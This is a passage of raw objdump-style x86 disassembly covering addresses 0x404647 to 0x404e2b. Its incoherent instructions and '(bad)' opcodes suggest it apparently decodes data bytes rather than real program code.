  404647:	sbb    BYTE PTR [eax-0x3bb2bb80],cl
  40464d:	push   es
  40464e:	add    dl,BYTE PTR [eax+0x31]
  404651:	mov    BYTE PTR [eax],ah
  404653:	xor    al,0xa0
  404655:	dec    eax
  404656:	add    al,BYTE PTR [eax]
  404658:	pop    es
  404659:	sub    dl,BYTE PTR [ebx]
  40465b:	jo     0x40465d
  40465d:	adc    DWORD PTR [edx],0x500400
  404663:	pusha  
  404664:	adc    al,0x30
  404666:	and    al,al
  404668:	add    eax,0x42040071
  40466d:	adc    BYTE PTR [edi],dl
  40466f:	shr    BYTE PTR [ebx-0x64],1
  404672:	add    BYTE PTR [eax],dl
  404674:	push   ss
  404675:	sub    DWORD PTR [eax+0xc],eax
  404678:	rol    BYTE PTR [eax+0x30341180],1
  40467e:	out    0x1c,al
  404680:	inc    eax
  404681:	sub    eax,0xc22a40e0
  404686:	mov    dl,0x0
  404688:	stos   BYTE PTR es:[edi],al
  404689:	add    al,0xe4
  40468b:	add    BYTE PTR [edx],bl
  40468d:	mov    ds:0xa2020210,al
  404692:	xor    edx,DWORD PTR [eax]
  404694:	adc    DWORD PTR [edx],0x2028080
  40469a:	add    DWORD PTR [esi],eax
  40469c:	push   cs
  40469d:	mov    BYTE PTR [eax],cl
  40469f:	adc    BYTE PTR [ebx],al
  4046a1:	sbb    al,0x5
  4046a3:	adc    DWORD PTR [eax],esi
  4046a5:	mov    WORD PTR [ecx],es
  4046a7:	ror    BYTE PTR [edx],0x80
  4046aa:	add    al,0x44
  4046ac:	(bad)  
  4046ad:	inc    ebx
  4046ae:	dec    edx
  4046af:	add    al,al
  4046b1:	add    ah,BYTE PTR [ecx]
  4046b3:	inc    ecx
  4046b4:	add    BYTE PTR [eax+esi*4],al
  4046b7:	and    al,0xd
  4046b9:	adc    ah,BYTE PTR [ebx+0x21]
  4046bc:	add    BYTE PTR [eax],al
  4046be:	rol    BYTE PTR [eax+0x40],cl
  4046c1:	add    DWORD PTR [eax+0x62],edx
  4046c4:	add    eax,0x64404204
  4046c9:	sub    BYTE PTR [ecx+edx*1+0x24006201],al
  4046d0:	or     BYTE PTR fs:[esi-0x47ea007c],0x74
  4046d8:	inc    ecx
  4046d9:	add    BYTE PTR [eax],al
  4046db:	out    0x0,eax
  4046dd:	or     BYTE PTR [eax+0x20],ah
  4046e0:	add    BYTE PTR ds:0x21083077,cl
  4046e6:	add    DWORD PTR [edx-0x80],esp
  4046e9:	push   eax
  4046ea:	and    BYTE PTR [eax],al
  4046ec:	or     BYTE PTR [edx],al
  4046ee:	sbb    BYTE PTR [edx+0x2888608c],al
  4046f4:	add    al,BYTE PTR [eax+0x28000181]
  4046fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046fb:	add    dl,al
  4046fd:	add    BYTE PTR [eax],0x10
  404700:	jp     0x404774
  404702:	adc    BYTE PTR [ecx],al
  404704:	or     bl,BYTE PTR [eax]
  404706:	xchg   ecx,eax
  404707:	mov    BYTE PTR [esi],cl
  404709:	add    BYTE PTR [edx-0xadffac0],bl
  40470f:	or     dl,BYTE PTR [eax+eiz*4]
  404712:	sub    BYTE PTR [eax+0x44],0x18
  404716:	or     BYTE PTR [ebp-0x2ffcff76],al
  40471c:	sbb    cl,BYTE PTR [ebx]
  40471e:	and    BYTE PTR [edx],0x3
  404721:	add    al,0x48
  404724:	pop    es
  404725:	add    BYTE PTR [eax+eax*1+0x4],0x44
  40472a:	mov    al,BYTE PTR [eax]
  40472c:	mov    al,ds:0x4288800
  404731:	ret    
  404732:	dec    eax
  404733:	add    DWORD PTR [eax+0x853914a],edx
  404739:	dec    esp
  40473a:	add    BYTE PTR [eax+eiz*4-0x3d],dl
  40473e:	adc    DWORD PTR [edx-0x4ffd8b20],esp
  404744:	or     BYTE PTR [eax],dh
  404746:	add    al,BYTE PTR [eax+eax*1+0x201809]
  40474d:	dec    eax
  40474e:	or     BYTE PTR [esp+eax*1+0x20],al
  404752:	and    edi,DWORD PTR [eax+0x62821843]
  404758:	or     BYTE PTR [edx],ah
  40475a:	sub    BYTE PTR [ecx],al
  40475c:	add    DWORD PTR [eax+0x44190711],edi
  404762:	adc    eax,0x240518a2
  404767:	out    0x82,al
  404769:	inc    ecx
  40476a:	popa   
  40476b:	add    BYTE PTR [ecx+esi*1+0x5],dl
  40476f:	mov    ds:0x8600570,al
  404774:	add    BYTE PTR [eax+0x4c],0x4
  404778:	adc    BYTE PTR [eax-0x47],al
  40477b:	add    eax,0x41e10980
  404780:	adc    BYTE PTR ds:0xa080800,ch
  404786:	add    al,0xa8
  404788:	add    eax,0xd0280810
  40478d:	inc    edx
  40478e:	or     eax,0x80020f9
  404793:	lds    esp,FWORD PTR [ecx+0xe630000]
  404799:	adc    BYTE PTR ds:0x48044254,ah
  40479f:	adc    BYTE PTR [edx],dh
  4047a1:	add    eax,0x9c4e080b
  4047a6:	adc    al,0x44
  4047a8:	add    al,0x78
  4047aa:	test   DWORD PTR [ebx],ecx
  4047ac:	sbb    DWORD PTR [eax+0x18964400],0x84c41cc6
  4047b6:	adc    BYTE PTR [eax],dl
  4047b8:	add    BYTE PTR [edx-0x4b],cl
  4047bb:	adc    BYTE PTR [eax+0x19],bh
  4047be:	add    BYTE PTR [eax],cl
  4047c0:	shl    BYTE PTR [ebx+0x14],1
  4047c3:	imul   ebx,DWORD PTR [eax],0x1415808
  4047c9:	and    al,0x80
  4047cc:	(bad)  
  4047cd:	dec    eax
  4047ce:	inc    eax
  4047cf:	add    BYTE PTR [eax],0x94
  4047d2:	ins    BYTE PTR es:[edi],dx
  4047d3:	add    BYTE PTR [eax],al
  4047d5:	nop
  4047d6:	or     ah,BYTE PTR [eax]
  4047d8:	inc    edx
  4047d9:	xor    al,0x22
  4047db:	add    ah,BYTE PTR [esi+0x2e820c90]
  4047e1:	dec    eax
  4047e2:	add    BYTE PTR [ebx],ah
  4047e4:	and    BYTE PTR [eax],al
  4047e6:	inc    eax
  4047e7:	add    al,0x18
  4047e9:	outs   dx,BYTE PTR ds:[esi]
  4047ea:	or     eax,0x18008600
  4047ef:	and    BYTE PTR [edi+0x2],0x2a
  4047f3:	mov    BYTE PTR [eax+eax*2],cl
  4047f6:	and    dh,bl
  4047f8:	inc    eax
  4047f9:	xchg   edx,eax
  4047fa:	or     dl,BYTE PTR [ebx]
  4047fc:	add    BYTE PTR [eax],al
  4047fe:	mov    bl,0x1
  404800:	add    DWORD PTR [ebx+edx*8],0xa0420080
  404807:	sbb    BYTE PTR [edx+0x26219040],0x68
  40480e:	mov    ch,0x40
  404810:	jne    0x4047a3
  404812:	and    al,0x15
  404814:	add    BYTE PTR [eax],ch
  404816:	adc    BYTE PTR [edx],ah
  404818:	push   ss
  404819:	sub    al,cl
  40481b:	push   esp
  40481c:	test   BYTE PTR [edx+0x41040012],al
  404822:	ins    BYTE PTR es:[edi],dx
  404823:	cdq    
  404824:	add    BYTE PTR [eax],0x8
  404827:	sbb    al,0x28
  404829:	and    BYTE PTR [ecx],cl
  40482b:	sub    BYTE PTR [eax-0x77],al
  40482e:	popa   
  40482f:	test   BYTE PTR [ebx],bh
  404831:	or     BYTE PTR gs:[eax+0x40],al
  404835:	or     eax,DWORD PTR [ecx]
  404837:	adc    BYTE PTR [eax+0x44],al
  40483a:	add    BYTE PTR [eax],dl
  40483c:	sbb    BYTE PTR [edx+0x5004107],al
  404842:	cmp    DWORD PTR [eax],eax
  404844:	push   ebp
  404845:	adc    DWORD PTR [eax],edx
  404847:	dec    ecx
  404848:	pop    es
  404849:	add    BYTE PTR [ebx],al
  40484b:	inc    edx
  40484c:	inc    ebx
  40484d:	adc    dh,BYTE PTR [eax]
  40484f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404850:	ror    BYTE PTR ds:0x1c842045,0x0
  404857:	adc    BYTE PTR [edx],al
  404859:	inc    eax
  40485a:	push   eax
  40485b:	dec    edi
  40485c:	rol    BYTE PTR [eax+eax*1],0x4d
  404860:	cs loop 0x4048c3
  404863:	or     BYTE PTR [eax],al
  404865:	add    BYTE PTR [esi],dl
  404867:	or     DWORD PTR [eax+0x223a94cd],esp
  40486d:	pusha  
  40486e:	shl    BYTE PTR [ebx],0x22
  404871:	dec    edi
  404872:	or     BYTE PTR ds:0xa55a6000,ah
  404878:	inc    eax
  404879:	add    BYTE PTR [esp+eiz*4],dl
  40487c:	push   0xd0248040
  404881:	inc    eax
  404882:	adc    BYTE PTR [eax+0x2],al
  404885:	add    BYTE PTR [edx+0x4],al
  404888:	add    BYTE PTR [eax],al
  40488a:	add    dl,BYTE PTR [edx]
  40488c:	add    BYTE PTR [ebx],al
  40488e:	sub    BYTE PTR [eax],al
  404890:	mov    dh,BYTE PTR [eax+0x14001216]
  404896:	add    BYTE PTR [ecx],cl
  404898:	adc    DWORD PTR [ecx],ecx
  40489a:	sbb    DWORD PTR [eax],eax
  40489c:	ret    
  40489d:	popa   
  40489e:	add    BYTE PTR [eax+0xc14038],al
  4048a4:	inc    eax
  4048a5:	adc    al,0xb
  4048a7:	rol    DWORD PTR [eax+0x15],0x8
  4048ab:	inc    eax
  4048ac:	cmp    BYTE PTR [eax],al
  4048ae:	and    BYTE PTR [eax-0x3ddee7fc],dl
  4048b4:	add    DWORD PTR [esi+eax*2],edx
  4048b7:	pusha  
  4048b8:	and    al,0x2
  4048ba:	xor    BYTE PTR [eax],al
  4048bc:	rol    BYTE PTR [eax],cl
  4048be:	add    bl,BYTE PTR [ecx]
  4048c0:	push   eax
  4048c1:	add    DWORD PTR [esi],esp
  4048c3:	xor    DWORD PTR [edx-0x1f7b77ef],eax
  4048c9:	or     al,0x4
  4048cb:	adc    BYTE PTR [eax+ecx*8+0x20],al
  4048cf:	add    BYTE PTR [edx-0x77bf0ed0],al
  4048d5:	add    BYTE PTR [edx+0x30],cl
  4048d8:	add    al,BYTE PTR [eax+0x70101c2]
  4048de:	add    BYTE PTR [eax-0x7e],al
  4048e1:	add    al,0x20
  4048e3:	add    BYTE PTR [eax],cl
  4048e5:	and    BYTE PTR [eax],al
  4048e7:	pusha  
  4048e8:	add    ah,BYTE PTR [ecx+eax*1]
  4048eb:	add    BYTE PTR [edx+0x2408a49],ah
  4048f1:	add    BYTE PTR [esp+eiz*4],dl
  4048f4:	and    BYTE PTR [eax],cl
  4048f6:	adc    al,BYTE PTR [ebp-0x29b2f16f]
  4048fc:	add    eax,DWORD PTR [ecx]
  4048fe:	add    BYTE PTR [eax+edx*4],dl
  404901:	rcl    BYTE PTR [ecx],1
  404903:	mov    DWORD PTR [eax+eax*1+0x2488a949],ebp
  40490a:	push   cs
  40490b:	add    BYTE PTR [edx],0x0
  40490e:	or     DWORD PTR [edx],ecx
  404910:	cmovno eax,DWORD PTR [eax]
  404913:	dec    eax
  404914:	add    DWORD PTR [eax],esp
  404916:	adc    eax,DWORD PTR [ecx]
  404918:	loopne 0x40489a
  40491a:	push   0x32406c40
  40491f:	ds ds push eax
  404922:	and    BYTE PTR [eax],ah
  404924:	inc    edx
  404925:	and    DWORD PTR es:[ecx+0x44742006],0x410a9925
  404930:	shl    BYTE PTR [edx+eax*1],1
  404933:	xor    eax,0x207104da
  404938:	into   
  404939:	add    al,0xe4
  40493b:	adc    BYTE PTR [eax],al
  40493d:	add    BYTE PTR [eax],ah
  40493f:	shl    BYTE PTR [eax+edx*1],1
  404942:	inc    edx
  404943:	add    eax,edi
  404945:	or     ah,BYTE PTR [eax]
  404947:	add    BYTE PTR [ecx+0x10844342],0xa9
  40494e:	or     BYTE PTR [edx],al
  404950:	dec    ecx
  404951:	add    DWORD PTR [edx],esp
  404953:	or     DWORD PTR [edx],esp
  404955:	add    BYTE PTR [ecx+0x21],al
  404958:	inc    eax
  404959:	inc    eax
  40495a:	enter  0x300c,0x80
  40495e:	adc    BYTE PTR [edx],al
  404960:	and    ecx,DWORD PTR [ecx-0x7756fff7]
  404966:	inc    ebx
  404967:	add    BYTE PTR [eax+eiz*1],cl
  40496a:	add    eax,0x3a04004
  40496f:	add    BYTE PTR [eax],ah
  404971:	shr    DWORD PTR [eax],0x48
  404974:	jo     0x404956
  404976:	sub    BYTE PTR [edi],al
  404978:	and    DWORD PTR [eax-0x53ef87f8],edx
  40497e:	jb     0x404991
  404980:	add    BYTE PTR [ecx],al
  404982:	les    esi,FWORD PTR [edx+0xc]
  404985:	test   BYTE PTR [eax+0x40083c18],ah
  40498b:	add    BYTE PTR [eax+0x50],al
  40498e:	mov    al,BYTE PTR [ebx]
  404990:	or     BYTE PTR [edx],al
  404992:	leave  
  404993:	add    ah,cl
  404995:	adc    BYTE PTR [ecx+edi*2+0x21],dl
  404999:	and    DWORD PTR [eax+0x4882083],esi
  40499f:	add    ah,BYTE PTR [esi+0x71000b]
  4049a5:	or     DWORD PTR ss:0x80111b02,edx
  4049ac:	sbb    al,0x48
  4049ae:	mov    BYTE PTR [eax],dh
  4049b0:	or     BYTE PTR [esi+0x40],al
  4049b3:	xchg   esp,eax
  4049b4:	add    BYTE PTR [edi],bh
  4049b6:	adc    eax,0x84002b5c
  4049bb:	and    ah,BYTE PTR [edx+eax*1]
  4049be:	inc    eax
  4049bf:	add    bh,BYTE PTR [eax]
  4049c1:	add    BYTE PTR [edx],al
  4049c3:	push   eax
  4049c4:	xor    eax,0x63820010
  4049c9:	nop
  4049ca:	mov    al,ds:0x2c200452
  4049cf:	add    DWORD PTR [eax+0x0],eax
  4049d2:	add    al,0x38
  4049d4:	and    al,0x10
  4049d6:	or     ah,BYTE PTR [eax]
  4049d8:	xor    BYTE PTR [edx],al
  4049da:	add    eax,ecx
  4049dc:	add    al,BYTE PTR ds:0x11428502
  4049e2:	jmp    0xe0595ce7
  4049e7:	inc    esi
  4049e8:	stos   BYTE PTR es:[edi],al
  4049e9:	push   esp
  4049ea:	adc    BYTE PTR [ecx],cl
  4049ec:	nop
  4049ed:	add    eax,0x66802500
  4049f2:	ds and dl,al
  4049f5:	and    al,0x40
  4049f8:	int3   
  4049f9:	adc    BYTE PTR [eax],al
  4049fb:	add    DWORD PTR [edx],eax
  4049fd:	and    al,0x1
  4049ff:	and    DWORD PTR [ecx+esi*1],ebp
  404a02:	sbb    BYTE PTR [edx],al
  404a04:	adc    BYTE PTR [ecx],al
  404a06:	les    esp,FWORD PTR [eax-0x3ffd6f76]
  404a0c:	aam    0x33
  404a0e:	sub    al,0x83
  404a10:	add    DWORD PTR [eax+edx*4+0x8],ecx
  404a14:	dec    ebx
  404a15:	sbb    esp,DWORD PTR es:[eax]
  404a18:	add    BYTE PTR [eax+0x5280204],al
  404a1e:	add    DWORD PTR [ecx],eax
  404a20:	adc    eax,0x5016f024
  404a25:	or     BYTE PTR [eax],ah
  404a27:	add    eax,0x98008000
  404a2c:	enter  0x11f3,0x2e
  404a30:	inc    eax
  404a31:	mov    eax,ds:0x41b81
  404a36:	add    BYTE PTR [ecx],cl
  404a38:	adc    BYTE PTR [edx+0x203a2418],al
  404a3e:	adc    BYTE PTR [eax],bl
  404a40:	cmp    BYTE PTR [edx-0x6b],cl
  404a43:	adc    ch,BYTE PTR [eax]
  404a45:	and    DWORD PTR [eax+0x829000],eax
  404a4b:	lods   al,BYTE PTR ds:[esi]
  404a4c:	add    BYTE PTR [eax-0x64],ah
  404a4f:	push   edx
  404a50:	or     al,0x82
  404a52:	and    al,BYTE PTR [esi]
  404a54:	add    eax,0x5032d1c1
  404a59:	sbb    al,0x50
  404a5b:	or     BYTE PTR [eax+ecx*1],al
  404a5e:	and    DWORD PTR [edx+0x32b92822],0x4100881
  404a68:	es inc edx
  404a6a:	add    BYTE PTR [eax+0x6a],cl
  404a6d:	add    DWORD PTR [ecx],eax
  404a6f:	inc    eax
  404a70:	xchg   ecx,eax
  404a71:	adc    al,0x21
  404a73:	adc    al,0x10
  404a75:	inc    eax
  404a76:	mov    BYTE PTR [ecx],al
  404a78:	es pop es
  404a7a:	push   es
  404a7b:	es (bad) 
  404a7d:	fadd   DWORD PTR [esp+eax*1+0x45]
  404a81:	adc    BYTE PTR [ebp+0x10],cl
  404a84:	dec    eax
  404a85:	and    al,0x20
  404a87:	push   edx
  404a88:	adc    BYTE PTR [eax],al
  404a8a:	add    dl,al
  404a8c:	add    BYTE PTR [eax+ebp*4+0x40],dl
  404a90:	ror    DWORD PTR [eax],0xd0
  404a93:	add    BYTE PTR [eax+0x8a2e131],bh
  404a99:	or     BYTE PTR [esi],al
  404a9b:	dec    edx
  404a9c:	add    BYTE PTR [edx-0x36],0xe2
  404aa0:	enter  0x1068,0x48
  404aa4:	push   es
  404aa5:	pusha  
  404aa6:	push   ecx
  404aa7:	xor    ah,BYTE PTR [eax+eiz*1]
  404aaa:	and    al,0x0
  404aac:	mov    ch,0x0
  404aae:	dec    eax
  404aaf:	adc    BYTE PTR ds:0x24411b82,ah
  404ab5:	add    BYTE PTR [ecx-0x80],ch
  404ab8:	or     dh,BYTE PTR [ecx]
  404aba:	mov    eax,DWORD PTR [edx-0x29]
  404abd:	and    BYTE PTR [eax],ah
  404abf:	sbb    BYTE PTR [eax+0x30],dh
  404ac2:	xchg   edx,eax
  404ac3:	dec    eax
  404ac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ac5:	add    bl,al
  404ac7:	add    BYTE PTR [eax-0x40],dl
  404aca:	xor    BYTE PTR [eax],dh
  404acc:	add    DWORD PTR [eax+edx*1],eax
  404acf:	add    BYTE PTR [ebx+0x20000100],al
  404ad5:	je     0x404b04
  404ad7:	mov    al,ds:0x33005258
  404adc:	sub    BYTE PTR [eax+0x60],al
  404adf:	xor    DWORD PTR [edx+eax*4],edx
  404ae2:	add    BYTE PTR [edx+0x161170ce],0x41
  404ae9:	add    BYTE PTR ds:0x50009130,dh
  404aef:	dec    eax
  404af0:	add    BYTE PTR [edx],cl
  404af2:	xchg   BYTE PTR [ecx],al
  404af4:	mov    ah,0x22
  404af6:	mov    cl,0x91
  404af8:	sbb    al,BYTE PTR [ebx]
  404afa:	dec    edx
  404afb:	mov    WORD PTR [eax-0x70],fs
  404afe:	or     ecx,esp
  404b00:	push   ss
  404b01:	ret    0x282
  404b04:	or     eax,0x6a0080c8
  404b09:	sar    BYTE PTR [eax],0x10
  404b0c:	sub    BYTE PTR [eax],ch
  404b0e:	and    DWORD PTR [ecx+ebx*1+0x1030890],edx
  404b15:	add    al,0x8a
  404b17:	inc    esp
  404b18:	xor    BYTE PTR [eax],al
  404b1a:	inc    eax
  404b1b:	add    ah,BYTE PTR [eax+0x48114840]
  404b21:	push   cs
  404b22:	add    BYTE PTR [eax+eax*4+0xc058008],bh
  404b29:	add    BYTE PTR [eax-0x7ecf5cea],al
  404b2f:	mov    BYTE PTR [eax+0x40000108],al
  404b35:	xchg   esi,eax
  404b36:	fst    DWORD PTR [eax+0x49]
  404b39:	sub    ebp,DWORD PTR [edx]
  404b3b:	add    BYTE PTR [edx],ch
  404b3d:	xor    BYTE PTR [ebx],dl
  404b3f:	test   BYTE PTR [esp+ecx*2],dh
  404b42:	inc    edx
  404b43:	sub    BYTE PTR [ecx],al
  404b45:	add    BYTE PTR [edx+edx*8+0x30210513],ah
  404b4c:	adc    BYTE PTR es:[eax+0x1082441],0x95
  404b54:	and    eax,DWORD PTR [eax+ebp*1+0x0]
  404b58:	or     ch,BYTE PTR [edx]
  404b5a:	popa   
  404b5b:	inc    eax
  404b5c:	and    dl,BYTE PTR [ecx]
  404b5e:	add    BYTE PTR [ebx],dl
  404b60:	ins    BYTE PTR es:[edi],dx
  404b61:	add    DWORD PTR [eax],ecx
  404b63:	pusha  
  404b64:	add    BYTE PTR [eax-0x80],bl
  404b67:	sbb    al,0x8
  404b69:	je     0x404af3
  404b6b:	popa   
  404b6c:	add    al,0x8
  404b6e:	add    DWORD PTR [eax+0x40],ebp
  404b71:	or     BYTE PTR [edx],0xa1
  404b74:	or     BYTE PTR [eax+0xa100281],ah
  404b7a:	add    DWORD PTR [eax],0x0
  404b7d:	or     BYTE PTR [eax],ah
  404b7f:	nop
  404b80:	and    BYTE PTR [eax],ah
  404b82:	or     BYTE PTR [ebx],ah
  404b84:	pop    ebx
  404b85:	and    BYTE PTR [edx-0x3bfeffe0],al
  404b8b:	adc    ah,BYTE PTR [eax]
  404b8d:	adc    BYTE PTR [eax],bl
  404b8f:	or     BYTE PTR [esi],bl
  404b91:	inc    ecx
  404b92:	cmp    al,BYTE PTR [ebp+0x48]
  404b95:	add    BYTE PTR [edx+0x10040458],0x21
  404b9c:	add    eax,DWORD PTR [ecx+0x453a0a0]
  404ba2:	retf   0x120
  404ba5:	push   es
  404ba6:	adc    BYTE PTR [eax],al
  404ba8:	adc    DWORD PTR [ecx-0x5f],edx
  404bab:	sub    al,BYTE PTR [edx+0xc]
  404bae:	add    al,0x80
  404bb0:	add    ch,ch
  404bb2:	adc    BYTE PTR [eax+0x10241070],al
  404bb8:	and    BYTE PTR [ebx],al
  404bba:	xor    BYTE PTR [edx+0x61908084],bh
  404bc0:	rol    DWORD PTR [eax+eax*1+0x10],1
  404bc4:	inc    esp
  404bc5:	add    eax,0x246004
  404bca:	push   es
  404bcb:	mov    WORD PTR [eax+0x4c18205],ss
  404bd1:	inc    eax
  404bd2:	or     al,dh
  404bd4:	push   ss
  404bd5:	inc    esi
  404bd6:	add    eax,0x503400a
  404bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bdc:	and    cl,BYTE PTR [edx+0x7b24080a]
  404be2:	or     al,0x38
  404be4:	mov    ah,0x8
  404be6:	or     DWORD PTR [ebx-0x6f],ecx
  404be9:	sub    BYTE PTR [eax+esi*2],al
  404bec:	add    al,0x10
  404bee:	mov    al,ds:0x6905080
  404bf3:	sub    BYTE PTR [ecx+0x45],0x20
  404bf7:	inc    eax
  404bf8:	add    BYTE PTR [eax+0x24],dh
  404bfb:	add    BYTE PTR [eax+0x4a],dl
  404bfe:	xor    ah,ch
  404c00:	add    BYTE PTR [edx],0x84
  404c03:	or     BYTE PTR [eax],bl
  404c05:	add    dl,BYTE PTR [eax+eax*2]
  404c08:	xchg   esp,eax
  404c09:	mov    bh,0xe4
  404c0b:	inc    eax
  404c0c:	mov    al,ds:0x402ba4c0
  404c11:	inc    edi
  404c12:	add    al,0x84
  404c14:	xchg   BYTE PTR [eax],ah
  404c16:	add    BYTE PTR [ecx],al
  404c18:	push   es
  404c19:	sub    BYTE PTR ds:0xe8816008,ah
  404c1f:	add    edx,DWORD PTR [edx+0x128800c2]
  404c25:	inc    edx
  404c26:	add    BYTE PTR [eax],al
  404c28:	mov    BYTE PTR [ebx+0x1111c099],dl
  404c2e:	adc    BYTE PTR [esi+0x21],cl
  404c31:	add    BYTE PTR [ecx+edx*1],al
  404c34:	add    ecx,DWORD PTR [eax]
  404c36:	add    DWORD PTR [edx-0x80],eax
  404c39:	and    BYTE PTR [edx+eiz*4],bl
  404c3c:	nop
  404c3d:	adc    BYTE PTR [eax+eiz*2],0x49
  404c41:	add    BYTE PTR ds:0x400c0072,al
  404c47:	adc    dl,BYTE PTR [eax]
  404c49:	add    DWORD PTR [ecx],edx
  404c4b:	or     dl,BYTE PTR [ebx+0x8]
  404c4e:	mov    cl,BYTE PTR [edx]
  404c50:	add    DWORD PTR [eax],ecx
  404c52:	sbb    BYTE PTR [edx],al
  404c54:	adc    BYTE PTR cs:[edx],0x48
  404c58:	add    al,0x63
  404c5a:	or     al,BYTE PTR [eax]
  404c5c:	add    DWORD PTR [eax],eax
  404c5e:	push   cs
  404c5f:	fadd   QWORD PTR [eax+0x40881420]
  404c65:	add    BYTE PTR [edx+eax*1+0x61880b80],al
  404c6c:	inc    edx
  404c6d:	add    BYTE PTR [eax],0x20
  404c70:	adc    BYTE PTR [eax+0x2d210600],dl
  404c76:	or     DWORD PTR [eax],0xd0881108
  404c7c:	pusha  
  404c7d:	ret    0x15c1
  404c80:	or     BYTE PTR [eax],0x32
  404c83:	adc    bl,BYTE PTR [eax+0x20]
  404c86:	add    al,BYTE PTR [ebx]
  404c88:	mov    BYTE PTR [edx],al
  404c8a:	inc    eax
  404c8b:	adc    DWORD PTR [eax],eax
  404c8d:	sub    BYTE PTR [ecx],ch
  404c8f:	js     0x404c91
  404c91:	inc    esp
  404c92:	push   0xd0800914
  404c97:	es add al,0x2
  404c9a:	loopne 0x404ce0
  404c9c:	pop    edx
  404c9d:	or     BYTE PTR [eax],al
  404c9f:	nop
  404ca0:	rol    BYTE PTR [ecx+0xa106018],0x6
  404ca7:	add    DWORD PTR [edx+eiz*1+0x28],eax
  404cab:	xor    DWORD PTR [eax],0x1c041102
  404cb1:	sbb    BYTE PTR [ecx+ecx*1],al
  404cb4:	adc    BYTE PTR [edi],al
  404cb6:	add    ah,BYTE PTR [eax+0x210a7820]
  404cbc:	dec    edx
  404cbd:	push   ebp
  404cbe:	adc    al,0x8
  404cc0:	adc    DWORD PTR [ebx],ecx
  404cc2:	and    al,0xc0
  404cc4:	adc    BYTE PTR ds:0x433088,0x3a
  404ccb:	adc    al,0x6
  404ccd:	push   esi
  404cce:	add    al,0x4
  404cd0:	jl     0x404cd4
  404cd2:	add    BYTE PTR [eax],dl
  404cd4:	add    BYTE PTR [ecx-0x372f2f7e],cl
  404cda:	or     BYTE PTR [eax+0x42044506],0x20
  404ce1:	add    BYTE PTR [edx+0x1b],al
  404ce4:	inc    eax
  404ce5:	add    DWORD PTR [edx],edx
  404ce7:	add    BYTE PTR [eax],al
  404ce9:	call   0x42ae4e
  404cee:	mov    cl,ah
  404cf0:	shl    BYTE PTR [eax],1
  404cf2:	dec    esp
  404cf3:	cmp    BYTE PTR [ecx],al
  404cf5:	sbb    BYTE PTR [edx+0x2304b482],dl
  404cfb:	or     ah,BYTE PTR [ecx]
  404cfd:	add    BYTE PTR [eax+ecx*1],0x80
  404d01:	lea    ecx,[esi]
  404d03:	sub    BYTE PTR [edi+edx*1],bl
  404d06:	inc    eax
  404d07:	inc    ebx
  404d08:	or     ch,al
  404d0a:	or     eax,0x47a0080b
  404d0f:	inc    eax
  404d10:	adc    BYTE PTR [eax+0x4],al
  404d13:	push   edx
  404d14:	and    al,0x30
  404d16:	add    BYTE PTR [eax+ecx*8+0x25982089],ah
  404d1d:	add    al,BYTE PTR ds:0x8074c220
  404d23:	add    BYTE PTR [edx],bl
  404d25:	add    al,0x0
  404d27:	adc    DWORD PTR [ebp-0x5c],eax
  404d2a:	adc    eax,0x1471a000
  404d2f:	and    BYTE PTR [ebp-0x4f],ah
  404d32:	and    BYTE PTR [eax],ah
  404d34:	mov    al,ds:0x263c1
  404d39:	test   DWORD PTR ds:0x494c04,esp
  404d3f:	xchg   edx,eax
  404d40:	add    BYTE PTR [ecx],al
  404d42:	xchg   ecx,eax
  404d43:	or     ch,cl
  404d45:	mov    ds:0x2b2415,al
  404d4a:	jo     0x404dc3
  404d4c:	inc    eax
  404d4d:	add    BYTE PTR [eax+ecx*2+0x1945080],al
  404d54:	xor    BYTE PTR [esp+esi*1+0x53],ah
  404d58:	and    DWORD PTR [esi-0x6b5ded38],esp
  404d5e:	add    al,0x24
  404d60:	inc    ecx
  404d61:	mov    al,ds:0x6280041
  404d66:	data16 and al,BYTE PTR [edx]
  404d69:	inc    edx
  404d6a:	or     al,BYTE PTR [edx]
  404d6c:	mov    al,0x6a
  404d6e:	add    BYTE PTR [ecx],al
  404d70:	sub    BYTE PTR [eax+0x4208911],ah
  404d76:	nop
  404d77:	inc    edx
  404d78:	and    DWORD PTR [eax-0x70],eax
  404d7b:	cmp    dl,BYTE PTR [ecx-0x57]
  404d7e:	adc    al,BYTE PTR [edi]
  404d80:	jmp    0xc92:0x88044640
  404d87:	add    BYTE PTR [edx+0x21],0x1
  404d8b:	add    BYTE PTR [ebp+ecx*1+0x0],dl
  404d8f:	and    BYTE PTR [eax],ch
  404d91:	push   eax
  404d92:	test   BYTE PTR [ecx],ah
  404d94:	adc    eax,0x70002303
  404d99:	dec    ecx
  404d9a:	add    BYTE PTR [eax+0x71180],al
  404da0:	push   es
  404da1:	add    al,0x20
  404da3:	mov    esp,?
  404da5:	add    esp,DWORD PTR [eax+0x30804408]
  404dab:	rol    BYTE PTR [ecx],cl
  404dad:	add    eax,0x1030530f
  404db2:	add    ah,bl
  404db4:	and    eax,0x3004de02
  404db9:	sbb    BYTE PTR [eax+eax*1],0xc0
  404dbd:	data16 add BYTE PTR [edx+0x48c240e8],ah
  404dc4:	add    BYTE PTR [ecx+0x40012209],dl
  404dca:	add    al,0xc0
  404dcc:	sbb    BYTE PTR [ebp+0x48580c08],al
  404dd2:	add    BYTE PTR [eax+0x1],al
  404dd5:	ss inc eax
  404dd7:	xor    BYTE PTR [eax],al
  404dd9:	adc    BYTE PTR ds:0x81b91100,al
  404ddf:	add    BYTE PTR [eax],0x40
  404de2:	add    eax,0x12408308
  404de7:	inc    edi
  404de8:	nop
  404de9:	mov    DWORD PTR [ebx],esp
  404deb:	rol    BYTE PTR [eax+0xb101480],0xcd
  404df2:	sbb    ebx,DWORD PTR [eax+0x5]
  404df5:	add    BYTE PTR [ebx],al
  404df7:	dec    eax
  404df8:	and    eax,0x12830500
  404dfd:	mov    BYTE PTR [eax+0x31],al
  404e00:	add    al,0x2
  404e02:	add    BYTE PTR [eax],ah
  404e04:	add    eax,0x3209008
  404e09:	push   eax
  404e0a:	pop    ecx
  404e0b:	add    ch,al
  404e0d:	test   BYTE PTR [eax+0x2040c028],dl
  404e13:	mov    eax,ds:0x30448134
  404e18:	add    eax,0x24009030
  404e1d:	add    al,BYTE PTR [ecx]
  404e1f:	mov    edi,DWORD PTR [eax]
  404e21:	sbb    al,BYTE PTR [edi]
  404e23:	or     BYTE PTR [edx+0xf36080],dl
  404e29:	add    BYTE PTR [edx],dl
  404e2b:	dec    eax
